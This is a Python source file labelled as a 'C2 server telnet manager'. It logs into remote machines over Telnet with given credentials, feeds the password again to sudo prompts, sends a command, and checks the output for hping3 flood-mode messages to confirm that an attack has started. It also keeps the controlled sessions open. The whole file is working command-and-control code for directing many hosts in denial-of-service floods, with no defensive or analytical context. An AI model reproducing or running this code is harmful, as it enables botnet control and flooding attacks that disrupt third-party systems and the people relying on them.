# C2 server telnet manager
import telnetlib
import logging
import time

class TelnetManager:
    def __init__(self):
        self.active_sessions = {}
    
    def execute_telnet_login_and_send(self, ip, username, password, command):
        """Establish Telnet connection, login, send command, and verify execution"""
        tn = None
        try:
            logging.info(f"Attempting Telnet connection to {ip}:23")
            tn = telnetlib.Telnet(ip, 23, timeout=25)
            logging.info(f"Telnet connection to {ip} established")

            # Handle login prompt
            login_patterns = [b"login: ", b"Username: ", b"Login: "]
            try:
                index, match, response = tn.expect(login_patterns, timeout=15)
                response_text = response.decode(errors='ignore')
                logging.info(f"Login response from {ip}: {response_text}")
                
                if not match:
                    logging.error(f"✗ No login prompt detected on {ip}")
                    tn.close()
                    return None
            except Exception as e:
                logging.error(f"✗ Timeout or error waiting for login prompt on {ip}: {e}")
                tn.close()
                return None

            # Send username
            tn.write(username.encode() + b"\n")
            logging.info(f"Sent username '{username}' to {ip}")

            # Handle password prompt
            password_patterns = [b"Password: ", b"password: ", b"Password:", b"password:"]
            try:
                index, match, response = tn.expect(password_patterns, timeout=10)
                response_text = response.decode(errors='ignore')
                logging.info(f"Password prompt response from {ip}: {response_text}")
                
                if not match:
                    logging.error(f"✗ No password prompt detected on {ip}")
                    tn.close()
                    return None
            except Exception as e:
                logging.error(f"✗ Timeout or error waiting for password prompt on {ip}: {e}")
                tn.close()
                return None

            # Send password
            tn.write((password or "").encode() + b"\n")
            logging.info(f"Sent password to {ip}")

            # Wait for shell prompt after login
            shell_patterns = [b"$ ", b"# ", b"> ", b"$", b"#", b">"]
            try:
                index, match, response = tn.expect(shell_patterns, timeout=15)
                response_text = response.decode(errors='ignore')
                logging.info(f"Shell prompt response from {ip}: {response_text}")
                
                # Check for login failure messages
                if any(msg in response_text.lower() for msg in ['login incorrect', 'access denied', 'authentication failed']):
                    logging.error(f"✗ Login failed for {ip} - authentication rejected")
                    tn.close()
                    return None
                    
                if not match:
                    logging.error(f"✗ No shell prompt detected on {ip} after login")
                    tn.close()
                    return None
            except Exception as e:
                logging.error(f"✗ Timeout or error waiting for shell prompt on {ip}: {e}")
                tn.close()
                return None

            logging.info(f"✓ Successfully logged into {ip}, sending command: {command}")
            
            # Send the command
            tn.write(command.encode() + b"\n")
            time.sleep(2)

            # Check for sudo password prompt and command execution
            sudo_patterns = [
                b"[sudo] password for",
                b"Password:",
                b"password:",
                b"Enter password:"
            ]
            
            hping_patterns = [
                b"HPING",
                b"hping",
                b"--- hping statistic ---",
                b"flood mode"
            ]
            
            error_patterns = [
                b"command not found",
                b"Permission denied",
                b"sudo: command not found",
                b"hping3: command not found",
                b"No such file or directory"
            ]
            
            all_patterns = sudo_patterns + hping_patterns + error_patterns + shell_patterns
            
            try:
                index, match, response = tn.expect(all_patterns, timeout=20)
                response_text = response.decode(errors='ignore')
                logging.info(f"Command response from {ip}: {response_text}")

                if match:
                    matched_pattern = match.group(0)
                    
                    # Check for errors first
                    if any(pattern in matched_pattern for pattern in error_patterns):
                        logging.error(f"✗ Command failed on {ip}: {response_text}")
                        tn.close()
                        return None
                    
                    # Check if it's a sudo password prompt
                    elif any(pattern in matched_pattern for pattern in sudo_patterns):
                        logging.info(f"Sudo password prompt detected on {ip}, sending password")
                        tn.write(password.encode() + b"\n")
                        time.sleep(3)
                        
                        # After sending sudo password, check for command execution
                        post_sudo_patterns = hping_patterns + error_patterns + shell_patterns
                        try:
                            index2, match2, response2 = tn.expect(post_sudo_patterns, timeout=15)
                            response2_text = response2.decode(errors='ignore')
                            logging.info(f"Post-sudo response from {ip}: {response2_text}")
                            
                            if match2:
                                matched_pattern2 = match2.group(0)
                                
                                if any(pattern in matched_pattern2 for pattern in error_patterns):
                                    logging.error(f"✗ Command failed on {ip}: {response2_text}")
                                    tn.close()
                                    return None
                                elif any(pattern in matched_pattern2 for pattern in hping_patterns):
                                    logging.info(f"✓ Command successfully started on {ip}")
                                    time.sleep(2)
                                    # Store the session
                                    self.active_sessions[ip] = tn
                                    return tn
                                else:
                                    logging.warning(f"? Unknown response after sudo on {ip}: {response2_text}")
                                    self.active_sessions[ip] = tn
                                    return tn
                        except Exception as e:
                            logging.error(f"✗ Error after sudo password on {ip}: {e}")
                            tn.close()
                            return None
                    
                    # Check if command started directly
                    elif any(pattern in matched_pattern for pattern in hping_patterns):
                        logging.info(f"✓ Command started directly on {ip} (no sudo required)")
                        time.sleep(2)
                        self.active_sessions[ip] = tn
                        return tn
                    
                    else:
                        logging.warning(f"? Shell prompt returned immediately on {ip}")
                        self.active_sessions[ip] = tn
                        return tn
                else:
                    logging.warning(f"? No expected pattern matched on {ip}")
                    self.active_sessions[ip] = tn
                    return tn
                    
            except Exception as e:
                logging.error(f"✗ Error executing command on {ip}: {e}")
                tn.close()
                return None

        except Exception as e:
            logging.error(f"✗ Telnet execution failed for {ip}: {e}")
            if tn:
                try:
                    tn.close()
                except:
                    pass
            return None
    
    def close_session(self, session):
        """Close a telnet session"""
        try:
            # Remove from active sessions dict
            for ip, tn in list(self.active_sessions.items()):
                if tn == session:
                    del self.active_sessions[ip]
                    break
                    
            # Close the session
            if session:
                session.close()
                logging.info("Closed telnet session")
        except Exception as e:
            logging.error(f"Error closing telnet session: {e}")
    
    def close_all_sessions(self):
        """Close all active telnet sessions"""
        for ip in list(self.active_sessions.keys()):
            try:
                session = self.active_sessions[ip]
                session.close()
                logging.info(f"Closed telnet session for {ip}")
                del self.active_sessions[ip]
            except Exception as e:
                logging.error(f"Error closing telnet session for {ip}: {e}")
